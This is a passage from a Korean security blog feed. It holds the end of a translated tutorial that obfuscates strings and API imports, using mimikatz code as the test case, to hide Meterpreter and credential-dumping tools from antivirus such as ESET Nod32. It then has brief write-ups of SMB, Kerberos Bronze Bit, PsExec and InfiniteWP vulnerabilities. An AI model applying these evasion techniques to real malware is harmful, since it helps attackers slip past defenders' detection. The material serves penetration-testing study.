class="hljs-number">.0</span>/ucrt\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/shared\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/um\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/winrt -w -fdebug-compilation-dir -fno-use-cxa-atexit -fms-extensions -fms-compatibility -fms-compatibility-version=<span class="hljs-number">19.15</span><span class="hljs-number">.26726</span> -<span class="hljs-built_in">std</span>=c++<span class="hljs-number">14</span> -fdelayed-<span class="hljs-keyword">template</span>-parsing -fobjc-runtime=gcc -fcxx-exceptions -fexceptions -fdiagnostics-show-option -fcolor-diagnostics -x c++ -ferror-limit=<span class="hljs-number">1900</span> -target x86_64-pc-windows-msvc19<span class="hljs-number">.15</span><span class="hljs-number">.26726</span> -fsyntax-only -disable-<span class="hljs-built_in">free</span> -disable-llvm-verifier -discard-value-names -dwarf-column-info -debugger-tuning=gdb -momit-leaf-frame-pointer -v</code></pre><p>결과 확인!</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Someth_lNGj92poubUG[] = &#123;<span class="hljs-string">&#x27;\x53&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_UP7KUo4Sa8LC[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_ACsNhmIcS1tA[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span>;    TCHAR hid_User___Bhk5rL2239Kc[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_PFP2JD4HjR8w = LoadLibrary(hid_User___Bhk5rL2239Kc);    TCHAR hid_Messag_drqxgJLSrxfT[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_1W70P1kc8OJv = (_MessageBoxA) GetProcAddress(hid_hHandl_PFP2JD4HjR8w, hid_Messag_drqxgJLSrxfT);    TCHAR hid_User___EMmJBb201EuJ[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_vU1riOrVWM8g = LoadLibrary(hid_User___EMmJBb201EuJ);    TCHAR hid_Messag_GoaJMFscXsdw[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_6nzSLR0dttUn = (_MessageBoxA) GetProcAddress(hid_hHandl_vU1riOrVWM8g, hid_Messag_GoaJMFscXsdw);hid_Messag_1W70P1kc8OJv(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, hid_Someth_lNGj92poubUG, MB_OK);    hid_Messag_6nzSLR0dttUn(<span class="hljs-literal">NULL</span>, hid_Anothe_UP7KUo4Sa8LC, hid_Anothe_ACsNhmIcS1tA, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>볼 수 있듯이 문자열 난독화와 API 난독화 패스의 조합은 상당히 강력하다. <code>Test</code> 문자열은 작은 문자열은 무시하는 것으로 결정했기 때문에 남아있다. 그 후 난독화 소스 코드는 빌드할 수 있다.</p><pre><code class="hljs cpp">$ cp test/messagebox_simple.c.patch /tmp/test.c$ x86_64-w64-mingw32-gcc /tmp/test.c -o /tmp/toto.exe</code></pre><p>윈도우10 가상 머신에서 테스트 결과 원래 기능이 계속 작동하는 것으로 보인다. 더 중요한 것은 난독화된 바이너리에 <code>MessageBox</code> 문자열이 없다.</p><pre><code class="hljs cpp">$ rabin2 -zz /tmp/toto.exe | grep MessageBox | wc -l  <span class="hljs-number">0</span></code></pre><h3 id="Generalisation"><a href="#Generalisation" class="headerlink" title="Generalisation"></a>Generalisation</h3><p>안티바이러스 ESET Nod32 관련해서 우리는 <code>samlib.dll</code>과 관련된 API imports 중 특히 아래에 있는 API들을 숨기는 것이 중요하다는 것을 발견했다.</p><ul><li>SamConnect</li><li>SamConnectWithCreds</li><li>SamEnumerateDomainInSamServer</li><li>SamLookupDomainInSamServer</li><li>SamOpenDomain</li><li>SamOpenUser</li><li>SamOpenGroup</li><li>SamOpenAlias</li><li>SamQueryInformationUser</li><li>SamSetInformationUser</li><li>SamiChangePasswordUser</li><li>SamGetGroupsForUser</li><li>SamGetAliasMembership</li><li>SamGetMembersInGroup</li><li>SamGetMembersInAlias</li><li>SamEnumerateUsersInDomain</li><li>SamEnumerateGroupsInDomain</li><li>SamEnumerateAliasesInDomain</li><li>SamLookupNamesInDomain</li><li>SamLookupIdsInDomain</li><li>SamRidToSid</li><li>SamCloseHandle</li><li>SamFreeMemory</li></ul><p>이러한 함수들은 AV 엔진 어디에서도 블랙리스트에 있지 않지만 내부 탐지 신뢰 점수를 높인다. 이러한 함수에 <code>ApiCallConsumer</code>를 등록해야 하므로 이름과 함수 프로토타입이 필요하다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">static</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; ApiToHide_samlib = &#123;    &#123;<span class="hljs-string">&quot;SamConnect&quot;</span>,                     <span class="hljs-string">&quot;typedef NTSTATUS (__stdcall* _SamEnumerateDomainsInSamServer)(SAMPR_HANDLE ServerHandle, DWORD * EnumerationContext, PSAMPR_RID_ENUMERATION* Buffer, DWORD PreferedMaximumLength,DWORD * CountReturned);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamConnectWithCreds&quot;</span>,            <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnect)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, BOOLEAN Trusted);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamEnumerateDomainsInSamServer&quot;</span>, <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnectWithCreds)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, LSA_OBJECT_ATTRIBUTES * ObjectAttributes, RPC_AUTH_IDENTITY_HANDLE AuthIdentity, PWSTR ServerPrincName, ULONG * unk0);&quot;</span>&#125;,    ...&#125;</code></pre><p>그 후 이러한 컬렉션을 반복하고 각 컬렉션을 처리하기 위해 <code>main.cpp</code>를 업데이트한다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> <span class="hljs-keyword">const</span>&amp; el: ApiToHide_samlib)&#123;    <span class="hljs-keyword">auto</span> Cons = <span class="hljs-built_in">std</span>::make_unique&lt;ApiCallConsumer*&gt;(<span class="hljs-keyword">new</span> ApiCallConsumer(el.first, el.second,                                                                        <span class="hljs-string">&quot;samlib.dll&quot;</span>));    consumers.push_back(*Cons);&#125;</code></pre><p>여기서 <code>std::make_unique</code>는 이 반복문에서 힙에 있는 객체를 인스턴스화할 수 있기에 중요하고 나중에 이러한 객체를 수동으로 쉽게 해제할 수 있다. 이것은 더 이상 사용하지 않을 때 자동으로 해제될 것이다.</p><p>마지막으로 mimikatz, 특히 <code>kuhl_m_lsadump.c</code>로 난독화를 테스트할 수 있다.</p><pre><code class="hljs bash">bash run_example_mimikatz.sh <span class="hljs-built_in">test</span>/kuhl_m_lsadump.c</code></pre><p>이것은 흥미로운 결과를 만든다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/5.png"></p><p><code>samlib.dll</code>에서 가져온 API를 위한 Run-time dynamic linking</p><p>실제 함수 호출은 완벽하게 수정되었다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/6.png"></p><p><code>samlib.dll</code>에서 가져온 함수 호출들은 완벽하게 수정되었다.</p><p><code>PRINT_ERROR</code> 매크로 내부의 문자열은 <code>do&#123;&#125;while(0)</code>을 통해 매크로를 사용하여 난독화 되지 않았다. obfuscator의 버그를 찾는데 <code>mimikatz</code>보다 좋은 프로젝트를 찾기 못했다.</p><h2 id="개선사항"><a href="#개선사항" class="headerlink" title="개선사항"></a>개선사항</h2><p>이 부분은 여러분을 위해 남겨진 작업들이다 🙂</p><h3 id="More-stealth"><a href="#More-stealth" class="headerlink" title="More stealth"></a>More stealth</h3><p>run-time dynamic linking을 수행하기 위해 실제로 API <code>LoadLibrary/GetProcAddress</code>가 필요하지 않다.</p><p>후킹을 피하기 위해 이 함수들은 재구현하는 것이 좋고 이미 그것을 할 수 있는 오픈소스 프로젝트가 있다.(<a href="https://github.com/rapid7/ReflectiveDLLInjection/">ReflectiveDllInjection</a>)</p><p>여기까지 읽었다면, translation unit의 상단에 이러한 함수들을 위한 구현을 추가하고(<code>findInjectionSpot</code> 사용) WinAPI 대신에 구현을 사용하기 위해 메소드 <code>addGetProcAddress</code>를 업데이트하면 된다는 것을 알 것이다.</p><h3 id="Error-handling"><a href="#Error-handling" class="headerlink" title="Error handling"></a>Error handling</h3><ul><li><code>LoadLibrary</code>는 성공적으로 수행되지 않을 경우 <code>NULL</code>을 반환하므로 이에 대한 검사를 추가하여 오류를 정상적으로 복구할 수 있다. 현재 상황에서 크래시가 매우 잘 날 수도 있다.</li><li><code>GetProcAddress</code>도 오류가 발생하면 <code>NULL</code>을 반환하므로 이것도 확인하는 것이 중요하다.</li></ul><h2 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h2><p>이 글에서 우리는 정규식을 사용하지 않고 C/C++ 코드 베이스에서 함수 호출을 정확하게 교체할 수 있는 방법을 보여줬다. 모든 것은 안티바이러스 소프트웨어가 우리가 pentest를 하는 동안 사용하는 Meterpreter나 다른 소프트웨어에 관해 행동 정보를 정적으로 수집하는 것을 막기 위해 진행되었다.</p><p>ESET Nod32에 적용된 이 작업은 모든 Meterpreter 모듈이 탐지되지 않도록 하는 주요 단계였고 더 발전된 제품에 도움이 되었다.</p><p>API imports를 숨기는 것도 하나지만 악성코드가 실행되면 보안 소프트웨어가 API 호출 모니터링에 의해 행동 정보를 수집하는 방법도 있다.</p><p>그런 관점에서 다음 글은 의심스러운 Win32 API가 직접적인 syscalls을 하도록 자동적으로 refactoring 하는 것이다. 이것은 Cylance, Traps과 Kaspersky 같은 AV의 userland hook을 통한 런타임 탐지 우회의 핵심 단계이다.</p><h2 id="출처"><a href="#출처" class="headerlink" title="출처"></a>출처</h2><p>[1] The Rootkit Arsenal, Chapter 11, p.480.</p><p>[2]<a href="https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/">https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/evasion/">evasion</category>
      
      <category domain="https://hackyboiz.github.io/tags/meterpreter/">meterpreter</category>
      
      <category domain="https://hackyboiz.github.io/tags/obfuscation/">obfuscation</category>
      
      <category domain="https://hackyboiz.github.io/tags/iat/">iat</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/13/idioth/av_evasion_part2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-17140 : SMB uaf to info disclosure</title>
      <link>https://hackyboiz.github.io/2020/12/12/fabu1ous/2020-12-12/</link>
      <guid>https://hackyboiz.github.io/2020/12/12/fabu1ous/2020-12-12/</guid>
      <pubDate>Sat, 12 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blogs.360.cn/post/CVE-2020-17140-Analysis.html&quot;&gt;W</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17140-Analysis.html">Windows SMB Information Disclousure Analysis</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 7 ~ Windows 10</p><p>svr2.sys 드라이버</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>patch Tuesday(2020.12.08)에서 CVE-2020-17140가 패치되어 Write-up이 공개되었습니다. CVE-2020-17140은 <code>SMB2_SET_INFO</code> 패킷의 처리 로직에서 발생하는 use after free로 커널 메모리를 노출시키는 취약점입니다.</p><p>SMBv2 이후부터 LEASE라는 새로운 caching mechanism이 도입되었고 클라이언트는 <code>SMB2_CREATE_REQEUST_LEASE_V2</code> 패킷을 보내 공유 파일에 lease를 생성하고, <code>SMB2_SET_INFO</code> 패킷을 보내 공유 파일의 lease를 수정할 수 있습니다.</p><p>srv2.sys 드라이버는 SMB2_SET_INFO 패킷을 받으면 <code>srv2!Smb2UpdateLeaseFileName</code>를 호출해서 lease 이름을 수정하는데, new lease name이 기존의 old lease name보다 길 경우 새로운 메모리(newFileBuf)를 할당해 old lease name을 백업합니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_BYTE *)(v6 + <span class="hljs-number">114</span>) )ExFreePoolWithTag(oldFileBuf, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> ( v11 )memmove(newFileBuf, oldFileBuf, <span class="hljs-number">2</span>i64 * v11);</code></pre><p>old lease name을 담고 있던 oldFileBuf를 할당 해제한 후에 newFileBuf에 복사하기 때문에 use after free가 발생합니다. oldFileBuf를 해제한 후 댕글링 포인터의 상태에 따라 kernel info leak 또는 BSoD로 이어질 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/use-after-free/">use after free</category>
      
      <category domain="https://hackyboiz.github.io/tags/smb/">smb</category>
      
      <category domain="https://hackyboiz.github.io/tags/info-leak/">info leak</category>
      
      <category domain="https://hackyboiz.github.io/tags/bsod/">bsod</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/12/fabu1ous/2020-12-12/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-17049: Kerberos Bronze Bit Attack</title>
      <link>https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/</link>
      <guid>https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/</guid>
      <pubDate>Fri, 11 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bi</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/">CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>standard Windows versions since 2000</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Kerberos는 Windows Active Directory 도메인 내에서 사용자, 서버 및 기타 리소스를 서로 인증하는 데 사용되는 프로토콜입니다.<br>Kerberos의 기존 공격 방법인 Golden Ticket 및 Silver Ticket 공격의 변형인 Bronze Bit 공격이 공개되었습니다.</p><blockquote><p>Golden/Silver Ticket 공격<br>내부 네트워크에 침입한 이후 동일한 네트워크의 Kerberos 인증시스템을 사용하는 다른 시스템의 자격 증명을 위조하는 공격기법</p></blockquote><br><p>Bronze Bit는 Microsoft가 Kerberos 프로토콜에 추가 한 <code>S4U2self</code> 및 <code>S4U2proxy</code> 프로토콜을 악용하며 Kerberos 프로세스가 변조된 서비스 티켓을 감지할 수 없어 발생합니다. 공격을 위해서는 다음 조건이 만족되어야 합니다.</p><ol><li>해커는 내부 네트워크의 시스템 하나(Service1)를 장악해 Active Directory 내에 접근 권한이 있어야 합니다.</li><li>침입한 시스템인 Service1에 대한 암호 해시가 필요합니다.</li><li>Service1에는 다른 시스템(Service2)에 대한 제한된 신뢰 관계가 있습니다.</li></ol><p>위 조건이 만족되면 해커는 다음과 같은 공격이 가능합니다.</p><ol><li>사용자를 식별하고 티켓을 반환하는 <code>S4U2self</code> 에서 User2의 Service1 서비스 티켓을 가져옵니다. 이때 <code>force-forwardable</code> 옵션을 사용하면 반환하는 서비스 티켓이 전달 가능한 티켓으로 변환됩니다.</li><li>Service1의 해시로 티켓을 복호화하고 플래그 값의 두 번째 비트를 0→1 로 변경한 뒤 다시 암호화합니다. </li><li>조작된 티켓은 <code>S4U2proxy</code> 에서 전송되고 Service2에 대한 서비스 티켓이 User2로 반환되어 <code>User2.ccache</code>의 디스크에 기록됩니다.</li><li>해커는 Service1 유저(User1) 권한으로 Service2 유저(User2)의 Kerberos 서비스 티켓을 얻을 수 있어 User2 권한으로 Service2에 액세스가 가능합니다.</li></ol><p>이는 Golden/Silver Ticket과 유사한 공격 방법이지만 단일 비트 플립을 이용했기 때문에 Bronze Bit로 명명되었습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/kerberos/">kerberos</category>
      
      <category domain="https://hackyboiz.github.io/tags/bronze-bit/">bronze bit</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] PsExec Local Privilege Escalation</title>
      <link>https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/</link>
      <guid>https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/</guid>
      <pubDate>Thu, 10 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/psexec-local-privileg</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/tenable-techblog/psexec-local-privilege-escalation-2e8069adc9c8">PsExec Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>PsExec v2.2 all the way back to v1.72 (2006)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>아직 패치되지 않은 취약점입니다.</p></blockquote><p>SysInternals Suite에서 원격으로 애플리케이션을 실행할 수 있는 PsExec에서 Local Privilege Escalation 취약점이 발견됐습니다. 해당 취약점은 글을 작성한 시점의 버전인 PsExec v2.2까지 영향을 미치며 아직 패치되지 않았습니다.</p><p>PsExec 클라이언트와 원격 PSEXESVC 서비스는 named pipe를 통해 통신합니다. 그 중 <code>\\PSEXESVC</code> 파이프는 실행할 응용 프로그램, 명령줄 데이터 등 PsExec 클라이언트의 명령을 분석하여 실행하는 역할을 합니다. <code>\\PSEXESVC</code> 파이프는 Administrator만 read/write 권한을 가져 권한이 낮은 사용자가 파이프에 read\write 하는 것을 막습니다.</p><p>하지만 PSEXESVC가 <code>\\PSEXESVC</code> 파이프를 생성할 때 파이프가 이미 존재할 경우 해당 <code>\\PSEXESVC</code> 파이프의 handle을 가져옵니다. 따라서 낮은 권한의 애플리케이션이 PSEXESVC가 실행되기 전에 <code>\\PSEXESVC</code> 파이프를 생성하면 PSEXESVC는 자신이 생성한 파이프가 아닌 이미 존재하는 파이프의 handle을 가져옵니다. PSEXESVC가 낮은 권한으로 생성된 <code>\\PSEXESVC</code> 파이프의 handle을 가져오면 PSEXESVC을 통해 SYSTEM 권한으로 명령, 응용 프로그램 실행이 가능합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/named-pipe/">named pipe</category>
      
      <category domain="https://hackyboiz.github.io/tags/psexec/">psexec</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-28642: Auth bypass via password reset mechanism</title>
      <link>https://hackyboiz.github.io/2020/12/09/fabu1ous/2020-12-09/</link>
      <guid>https://hackyboiz.github.io/2020/12/09/fabu1ous/2020-12-09/</guid>
      <pubDate>Wed, 09 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ssd-disclosure.com/ssd-advisory-auth-bypass-and-r</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-auth-bypass-and-rce-in-infinite-wp-admin-panel/">Auth bypass and RCE in Infinite WP admin panel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Infinite WP &lt;= 2.15.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress 웹사이트의 관리 솔루션 Infinite WP에서 비밀번호 재설정 방식의 결함을 이용해 admin panel에 접근할 수 있는 인증 우회 취약점이 발견되었습니다.</p><pre><code class="hljs php">$hashValue = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;hashCode&#x27;</span> =&gt; <span class="hljs-string">&#x27;resetPassword&#x27;</span>, <span class="hljs-string">&#x27;uniqueTime&#x27;</span> =&gt; microtime(<span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;userPin&#x27;</span> =&gt; $userDets[<span class="hljs-string">&#x27;userID&#x27;</span>]));$resetHash = sha1($hashValue);[...]$verificationURL = APP_URL.<span class="hljs-string">&quot;login.php?view=resetPasswordChange&amp;resetHash=&quot;</span>.$resetHash.<span class="hljs-string">&quot;&amp;transID=&quot;</span>.sha1($params[<span class="hljs-string">&quot;email&quot;</span>]);</code></pre><p>비밀번호 재설정 링크를 생성하는 php코드입니다.  피해자의 <code>email</code>을 사전에 입수하고 <code>userID</code>,  <code>microtime(true)</code> 값을 유추할 수 있다면 누구나 유효한 링크를 타고 원하는 유저의 비밀번호를 재설정할 수 있습니다.</p><ul><li>userID<ul><li>auto-increment integer입니다. manage-user라는 유료 addon을 구매하지 않았다면 기본값이 1입니다.</li></ul></li><li>email<ul><li>가입되지 않은 email 주소라면 <code>login.php?view=resetPassword&amp;errorMsg=resetPasswordEmailNotFound</code>로 redirect 됩니다. 이를 이용해 Infinite WP에 가입된 email인지 판별할 수 있습니다.</li></ul></li><li>microtime(true)<ul><li>microtime(true)의 값은 비밀번호 재설정 링크가 만들어질 때의 Unix timestamp입니다. Http date 해더 값을 이용해 유추가 가능합니다.</li></ul></li></ul><p>생성된 링크는 24시간 동안 유효합니다. 공개된 POC는 위에서 설명한 세 값을 이용해 브루트포싱 공격을 시도하며 평균 1시간 내외로 유효한 링크를 찾아냅니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/09/fabu1ous/2020-12-09/#disqus_thread</comments>
      
    </item>
    
    <item>
